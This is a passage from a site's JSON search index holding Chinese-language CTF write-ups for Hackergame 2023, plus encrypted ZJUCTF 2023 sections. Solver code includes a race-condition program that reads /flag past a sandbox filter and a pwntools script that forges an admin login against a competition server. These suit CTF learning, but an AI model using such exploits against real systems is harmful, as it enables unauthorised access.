https://arxiv.org/abs/2010.15980","title":"Method"},{"location":"ctf/writeups/hackergame2023/#_8","text":"\u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 \u89e3\u9898\u4ee3\u7801 import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" )","title":"\ud83e\ude90 \u6d41\u5f0f\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#_9","text":"\u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002","title":"\ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403"},{"location":"ctf/writeups/hackergame2023/#komm-susser-flagge","text":"\u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002","title":"Komm, s\u00fcsser Flagge"},{"location":"ctf/writeups/hackergame2023/#flag_1","text":"\u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; }","title":"\u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21"},{"location":"ctf/writeups/hackergame2023/#_10","text":"\u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86","title":"\u5f02\u661f\u6b67\u9014"},{"location":"ctf/writeups/hackergame2023/#20_1","text":"\u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002","title":"\u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0"},{"location":"ctf/writeups/hackergame2023/#f5","text":"\u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" )","title":"\u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5"},{"location":"ctf/writeups/hackergame2023/#o1","text":"\u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com ( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive ()","title":"O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf"},{"location":"ctf/writeups/hackergame2023/#_11","text":"\u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"\u5176\u4ed6"},{"location":"ctf/writeups/zjuctf2023/","text":"k3WlHtHdYqKmPRMbP+Yv9A==;1IFQV5ISWlrsr6E3RPPk8zkvZSJ4PX4KbWRDDUAaOX96X4V6GwyrCvE5N3ZBu4TEedyU3pqXcdi365/858PNoVHwMjg8WgyLuRdRpkZgUwncea27KoaC71VIJVyQvr2OaLc9PLqg6X+s9jrOOgauumNGqe+MSd29lpPOT8scI9SHzyGVDuV6+Co1nHFXib4hBE+mWABCoAB/vl0KRFX1nK1ugE1/5gtsgBBpYuF2UksJGq7xnCPA3pLuEb8mfObGJ4W27vq8USGhr6Hnfserf1PLtkGgeXxjvdAm9QLf/81vn0h3Y00wdhxm3nhR+FlfarJMAMaOIxZj3ErJZAqnl14fH2rvcAMnyJsXASGkPn9hYMSj89Q9sMq4khcWPLfNKQ7hDcUJkEAK3t1DtZ1Dx+MzptcT5XCSBUzecIkLLIKS/CzBOJ1BvJXNlhjUiBJDeasHITspTX0ov+itOP3g1BokVbLiItxRy+LhPow1hLq3ilkYhlCNyOrtKjnDzPNQ2lm2RHjdzGEJiH6buXc5XjX/ksdiRm3mDn9BBg61c7ApjITPvS4/iiQbAKkcGzDJvmIYjpUmju5ZccNwKsSLeaWgbb2flAk0jExaE493dAsSre3fyjUrQGy7ZemWPTZ8thw66SWPheFpNmSKRW9JAtQEUh7PXQcmNdsD2DW1Af5aYc80TBnltu/kKHK7dQnXgw4IhCRp6csy08yVwsDrVFZ2BPrajhaUY9PXQ4EpNGMIo1lYCR6MJi3AltajhecMygYiX/o1DL/cpNDYNipTGBnsaJTBIyfikUoCnk/J3fVtz+7d/4G3XzGLflBCbwEbAccGw5/OW1uvRKj6/qZmKyB2IM9z+SpQrPGQqz4jEHRA5gCOsxZrkihBg7umJki0OCnoTxz04SFvTO5j1MU4Qsw6kHzfRgR6zp3S90pZ8hZ9bka9z8gB9sJGyK2z79CReEXOuj9dPVCUcYQGCXi0YjEYlD4Ruc7wcUtO2IWIdyz40N0HTV0XPsUHRrloiAEdcuvsSNxDVRzICJ5PSFFg73XzYtr2Hi/N4/snfD3KHQPppWjhirlzeqbHLKONn1g9s7n5n3YmKzv3rupRPvjY0g==;^","title":"\ud83d\udd12 ZJUCTF 2023"},{"location":"ctf/writeups/zjuctf2023/#zjuctf-2023-writeup","text":"swSCfVLB2510zvx20Lnkvw==;NyQXhsUJoilL9NBzHGYvnVOu5MpK+cx2m/5/ZZnZYO5q6Z/PpGScazrrQMcHY6+49I82N3sc1N4d5Yqiy6oF0SKEsD40GpLhRjREpsPfEIeJeaDvI7idAMJYvmgPFXlHxwSzMD/2KmZ68g69zxW0OuuGDSdZTxBF0PzVet4ro6cd3qFS0LYcvMf2t44n2ZymsGvGFGHCAyGNCwOKE6RGl+xd98zYfF/FwzFlK5fM+t9BX1RiKn+Zue0/QqgYrFkfBy/cE/4uLaQkVkOow/TzY/+/Y4UVb1tDcGhus7Bd9zNN/tPhwp+DRP9W7HUTLwoTMCQ3nnzWQbaDpQFfmCXIn+p2+PpM6C8+5OTttb/k6UqShVPgEjIeoHoms4ObLr6ic/fa6s+IaJObDQm0an15nc2Ji71D5WFPy2uaVQTyTgQBu2VRmBVfbI6EVY0HQ/w3tIYCsJh75L43uLSZP5zi/P9wVOxijeWmnKGRZy4Li4tCvfOgHK1qUthzkPbvAc71AXRYUVbsRneyXv5qf3Ol0FeK+tBF+SnqfjOeC9pHCDrGQFW8ZNn1DR/RAO1UsZzrhIlNhNTEua/6YARLs5j4EGcMYUzhn/tceqsbDCPWpIP168yIp8GTn0vBZ+bNBHqThVAfhMSA6Al2C/DGoQg487xCct51lcTYyPibMzfYlp/VSpqSstgbj7bbP3wzTuuJwx8kaEz6D6Pt/T2hx0LLUxg/hDCBruZmlKETDFwLUsrEdWn+GAeKO3ZA3ETnbNEi54k5d8SP4xn47cEy/dfWE1bxYTdnuxnlsQwQ3ggGeh3Q++NaYhRe3sL0plNW1iIe+088OXYAu7EI7gJrNG7bCbZ/6vlTq4S7ml3pW+wpanLFbEgR/Hm7h4hRGGK7JCrlx3IhKYSzWoM6J4iThXZCVUCAs37vJjjcfJB1GzKwxrWaMhnhG4+Z5zIdmhtrumDKEZJZaHaMVOolIDSAZ9vikQ==;^","title":"ZJUCTF 2023 Writeup"},{"location":"ctf/writeups/zjuctf2023/#misc","text":"h09eqkdbt1uxXCqDt4iQPQ==;eGp7IyRaAlKRlSLFAlIESWgIkXJYZSGy7m2smTvcWBw=;^","title":"misc"},{"location":"ctf/writeups/zjuctf2023/#todo","text":"muJhk/T9gkjK6xu5tiPa9g==;4Secuzv5kE9+L7XLOh7Ktc+qv5hoVKGqj5tGg1Bj7VQ=;^","title":"todo"},{"location":"ctf/writeups/zjuctf2023/#web","text":"aGkxP0VAaxoQXyYYSRUfUg==;4Ed7Z1PI8/diGNmFPaBn+AOJhOMttasR6gicpPd0n2o=;^","title":"web"},{"location":"ctf/writeups/zjuctf2023/#reverse","text":"tDs4NaGRmKsAS+o7PN+Nog==;dXu+SmY6sHu+manxB3ejRqNiMuhXzGLs5K0aGI7IYN4=;^","title":"reverse"},{"location":"ctf/writeups/zjuctf2023/#crypto","text":"sSzMy4HheErkEe5TvMx1Hg==;hpPZ21ls1e+laPj9CXeCYe1i7wZmD0Was6hoOBSJGfA=;^","title":"crypto"},{"location":"ctf/writeups/zjuctf2023/#pwn","text":"HPqP0pZouuQ8M/Qp1IA7LQ==;SYOX+SVixHGW8mmT7ntJPj5iOaYdkUZ0pxY2Ek2ljFw=;^","title":"pwn"},{"location":"others/","text":"\u6742\u9879 \u00b6 Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f Table of Contents \u00b6 note\u8ba1\u5212","title":"\u6742\u9879"},{"location":"others/#_1","text":"Abstract \u8fd9\u91cc\u662f\u4e00\u4e9b\u4e34\u65f6\u7684\u4e1c\u897f","title":"\u6742\u9879"},{"location":"others/#table-of-contents","text":"note\u8ba1\u5212","title":"Table of Contents"}]}